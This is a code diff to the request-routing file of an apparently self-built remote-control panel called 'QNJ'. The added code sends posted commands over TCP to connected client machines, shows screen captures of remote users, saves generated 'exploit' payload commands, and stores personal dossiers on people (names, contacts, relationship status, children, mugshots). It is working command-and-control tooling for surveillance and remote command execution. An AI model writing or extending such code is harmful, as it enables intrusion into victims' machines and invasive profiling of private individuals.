@@ -1,15 +1,17 @@
 #ifndef _PATHS_HPP_
 #define _PATHS_HPP_
 #include "../qnj_config.h"
+#include "../json/save_new_payload_cmd.hpp"
+#include "../json/save_client_data-0x00.hpp"
 #include "../memory/qnj_memory_pool.hpp"
 #include "../payloads/send_tcp_commands.hpp"
 #include "../server_2/TCP_handle_client.hpp"
+#include "../server_2/TCP_handle_client.h"
 #include "../shutdown/HTTP_SERVER_SHUTDOWN.hpp"
 #include "../lib/paths.h"
 #include "../lib/signup_save_data.h"
 #include "../networking/send_html_files.hpp"
 #include "../networking/send_html_client_side.hpp"
-#include "../networking/html_page.h"
 #include "../networking/utils/get_login_credentials.hpp"
 #include "../networking/Parse_stuff/parse_page.hpp"
 #include "../networking/Parse_stuff/parse_file_upload.hpp"
@@ -20,11 +22,13 @@
 #include "../networking/http/DIRECT_TO-PAGE.hpp"
 #include "../networking/http/DIRECT-REMOVE-COOKIE.hpp"
 #include "../save_user_signup.h"
-#include "../json/save_tcp_client_connections.hpp"
 
 void get_path_handler(const std::string& path, std::string& userIdCookieValue, std::string& data0x00UserIdCookieValue, int client_socket, std::string& requestHeaders);
 void post_path_handler(const std::string& path, std::string& userIdCookieValue, std::string& data0x00UserIdCookieValue, int client_socket, std::string& requestHeaders);
 //auto quick_return_client_data() { return returned_client_data_string(); }
+std::string web_gui_path = "/home/magician/Desktop/QNJ/web-gui/";
+std::string web_gui_file = "";
+int pgg_views = 0;
 
 
 void path_handler(const std::string& method, const std::string& path, int client_socket, std::string& userIdCookieValue, std::string& data0x00UserIdCookieValue, std::string& requestHeaders)
@@ -39,7 +43,8 @@ void path_handler(const std::string& method, const std::string& path, int client
     }
     else
     {
-        send_html_file("/home/magician/Desktop/QNJ/web-gui/405.html", "text/html", "405 Method Not Allowed", "HTTP/1.1", client_socket);
+        web_gui_file = "405.html";
+        send_html_file(web_gui_path + web_gui_file, "text/html", "405 Method Not Allowed", "HTTP/1.1", client_socket);
     }
 }
 
@@ -47,7 +52,9 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
 {
     if (path == "/")
     {
-        send_html_file("/home/magician/Desktop/QNJ/web-gui/index.html", "text/html", "200 OK", "HTTP/1.1", client_socket);
+        web_gui_file = "index.html";
+        pgg_views += 1;
+        send_html_file(web_gui_path + web_gui_file, "text/html", "200 OK", "HTTP/1.1", client_socket);
     }
 
     else if (path == "/login" || path == "/login/")
@@ -58,12 +65,15 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
         }
         else
         {
-            send_html_file("/home/magician/Desktop/QNJ/web-gui/login.html", "text/html", "200 OK", "HTTP/1.1", client_socket);
+            web_gui_file = "login.html";
+            pgg_views += 1;
+            send_html_file(web_gui_path + web_gui_file, "text/html", "200 OK", "HTTP/1.1", client_socket);
         }
     }
 
     else if (path == "/signup" || path == "/signup/")
     {
+        pgg_views += 1;
         send_html_file("/home/magician/Desktop/QNJ/web-gui/signup.html", "text/html", "200 OK", "HTTP/1.1", client_socket);
     }
 
@@ -72,19 +82,24 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
     {
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
+            pgg_views += 1;
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
             client_side_data += "<span id='QNJ-page-views'>";
-            client_side_data += std::to_string(page_views);
+            client_side_data += std::to_string(pgg_views);
             client_side_data += "</span>";
+            client_side_data += "<div class='QNJ-SCREEN-SHARE-CLIENT-MAIN' id='QNJ-SCREEN-SHARE-CLIENT-MAIN-ID'>";
+            client_side_data += "<img src='" + paths_file_path_ssuser + "'>";
+            client_side_data += "</div>";
             client_side_data += "<script src='/QNJ-Cloud/js/dashboard.js'></script>";
             replace_char(client_side_data, "%40", "@");
             content_send_file_w_client_side("/home/magician/Desktop/QNJ/web-gui/dashboard.html", "text/html", "200 OK", "HTTP/1.1", client_socket, client_side_data);
         }
         else
         {
-            send_html_file("/home/magician/Desktop/QNJ/web-gui/401.html", "text/html", "401 Unauthorized", "HTTP/1.1", client_socket);
+            web_gui_file = "401.html";
+            send_html_file(web_gui_path + web_gui_file, "text/html", "401 Unauthorized", "HTTP/1.1", client_socket);
         }
     }
 
@@ -92,11 +107,12 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
     {
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
+            pgg_views += 1;
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
             client_side_data += "<span id='QNJ-CONNECTIONS-DATA-SP'>";
-            client_side_data += return_client_connections_file();
+            client_side_data += extract_client_vector_data();
             client_side_data += "</span>";
             client_side_data += "<script src='/QNJ-Cloud/js/dashboard.js'></script>";
             replace_char(client_side_data, "%40", "@");
@@ -104,7 +120,8 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
         }
         else
         {
-            send_html_file("/home/magician/Desktop/QNJ/web-gui/401.html", "text/html", "401 Unauthorized", "HTTP/1.1", client_socket);
+            web_gui_file = "401.html";
+            send_html_file(web_gui_path + web_gui_file, "text/html", "401 Unauthorized", "HTTP/1.1", client_socket);
         }
     }
 
@@ -112,6 +129,7 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
     {
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
+            pgg_views += 1;
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
@@ -130,7 +148,8 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
             if (get_cookies_from_file(data0x00UserIdCookieValue, "/root/qnj-server/data-0x00-cookies.log"))
-            {
+            { 
+                pgg_views += 1;
                 std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
                 client_side_data += get_username_from_database();
                 client_side_data += "</span>";
@@ -140,6 +159,7 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
             }
             else
             {
+                pgg_views += 1;
                 std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
                 client_side_data += get_username_from_database();
                 client_side_data += "</span>";
@@ -158,6 +178,7 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
     {
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
+            pgg_views += 1;
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
@@ -175,6 +196,7 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
     {
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
+            pgg_views += 1;
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
@@ -192,6 +214,7 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
     {
         if (get_cookies_from_file(userIdCookieValue, "/root/qnj-server/general_cookie.log"))
         {
+            pgg_views += 1;
             std::string client_side_data = "<span id='QNJ-USERNAME-TEXT-SP'>";
             client_side_data += get_username_from_database();
             client_side_data += "</span>";
@@ -265,7 +288,6 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
             send_html_file("/home/magician/Desktop/QNJ/web-gui/401.html", "text/html", "401 Unauthorized", "HTTP/1.1", client_socket);
         }
     }
-
     //##### PNG FILES #####//
     else if (path.find("/QNJ-Cloud/assets/png/") == 0 && is_png_file(path.substr(23))) 
     {
@@ -301,6 +323,13 @@ void get_path_handler(const std::string& path, std::string& userIdCookieValue, s
             std::string full_path = "/home/magician/Desktop/QNJ" + path;
             send_html_file(full_path, "text/css", "200 OK", "HTTP/1.1", client_socket);
         }
+    }
+    
+    //###### PNG USER SS #####//
+    else if (path.find("/QNJ-Cloud/assets/ssusers/") == 0 && is_ss_user_file(path.substr(26)))
+    {
+        std::string full_path = full_path_extra_path + path;
+        send_html_file(full_path, "text/css", "200 OK", "HTTP/1.1", client_socket);
     }
 
     else
@@ -367,6 +396,14 @@ void post_path_handler(const std::string& path, std::string& userIdCookieValue, 
         sendRedirect("/dashboard/payloads", client_socket);
     }
 
+    else if (path == "/dashboard/api/send_payload_ss_reload" || path == "/dashboard/api/send_payload_ss_reload/")
+    {
+        std::string cmd_value = parsePostData(requestHeaders, "QNJ-PAYLOAD-CMD=");
+        std::string QNJ_client_id = parsePostData(requestHeaders, "QNJ-PAYLOAD-CMD-CLIENT-ID="); 
+        send_tcp_commands_to_client(cmd_value, QNJ_client_id);
+        sendRedirect("/dashboard", client_socket);
+    }
+
     //##### PAYLOAD GENERATION FILE #####//
     else if (path == "/dashboard/api/QNJ-GENERATE-0x00-EXPLOIT" || path == "/dashboard/api/QNJ-GENERATE-0x00-EXPLOIT")
     {
@@ -392,6 +429,7 @@ void post_path_handler(const std::string& path, std::string& userIdCookieValue, 
             std::string generated_path_name = parsePostData(requestHeaders, "QNJ-NEW-PAYLOAD-FILE-PATH=");
             std::cout << generated_cmd_name << "\n";
             std::cout << generated_path_name << "\n";
+            save_new_payload_cmd(generated_cmd_name, generated_path_name);
             sendRedirect("/dashboard/payloads", client_socket);
         }
         else
@@ -463,16 +501,7 @@ void post_path_handler(const std::string& path, std::string& userIdCookieValue, 
                 std::string children_amount = parsePostData(requestHeaders, "QNJ-data-0x00-children-name=");
                 std::string user_mugshot_pic = parsePostData(requestHeaders, "QNJ-data-0x00-userpic-name=");
 
-                std::cout << "First name: " << first_name << std::endl;
-                std::cout << "Last name: " << last_name << std::endl;
-                std::cout << "Age: " << age << std::endl;
-                std::cout << "Gender: " << gender << std::endl;
-                std::cout << "Email: " << email << std::endl;
-                std::cout << "Phonenumber: " << phonenumber << std::endl;
-                std::cout << "Country: " << country << std::endl;
-                std::cout << "City: " << city << std::endl;
-                std::cout << "Relation ship stat: " << material_status << std::endl;
-                std::cout << "Mugshot pic: " << user_mugshot_pic << std::endl;
+                save_client_data_0x00(first_name, last_name, age, gender, email, phonenumber, country, city, children_amount, material_status, user_mugshot_pic);
                             
                 sendRedirect("/dashboard/data-0x00", client_socket);
             }
@@ -490,28 +519,35 @@ void post_path_handler(const std::string& path, std::string& userIdCookieValue, 
     //##### PNG FILES #####//
     else if (path.find("/QNJ-Cloud/assets/png/") == 0 && is_png_file(path.substr(23))) 
     {
-        std::string full_path = "/home/magician/Desktop/QNJ" + path;
+        std::string full_path = full_path_extra_path + path;
         send_html_file(full_path, "image/png", "200 OK", "HTTP/1.1", client_socket);
     }
     
     //##### JAVASCRIPT FILES #####//
     else if (path.find("/QNJ-Cloud/js/") == 0 && is_js_file(path.substr(14))) 
     {
-        std::string full_path = "/home/magician/Desktop/QNJ" + path;
+        std::string full_path = full_path_extra_path + path;
         send_html_file(full_path, "text/javascript", "200 OK", "HTTP/1.1", client_socket);
     }
 
     //##### CSS FILES #####//
     else if (path.find("/QNJ-Cloud/styling/") == 0 && is_css_file(path.substr(19))) 
     {
-        std::string full_path = "/home/magician/Desktop/QNJ" + path;
+        std::string full_path = full_path_extra_path + path;
         send_html_file(full_path, "text/css", "200 OK", "HTTP/1.1", client_socket);
     }
 
     //##### SVG FILES #####//
     else if (path.find("/QNJ-Cloud/styling/") == 0 && is_svg_file(path.substr(19)))
     {
-        std::string full_path = "/home/magician/Desktop/QNJ" + path;
+        std::string full_path = full_path_extra_path + path;
+        send_html_file(full_path, "text/css", "200 OK", "HTTP/1.1", client_socket);
+    }
+
+    //###### PNG USER SS #####//
+    else if (path.find("/QNJ-Cloud/assets/ssusers/") == 0 && is_ss_user_file(path.substr(26)))
+    {
+        std::string full_path = full_path_extra_path + path;
         send_html_file(full_path, "text/css", "200 OK", "HTTP/1.1", client_socket);
     }
 
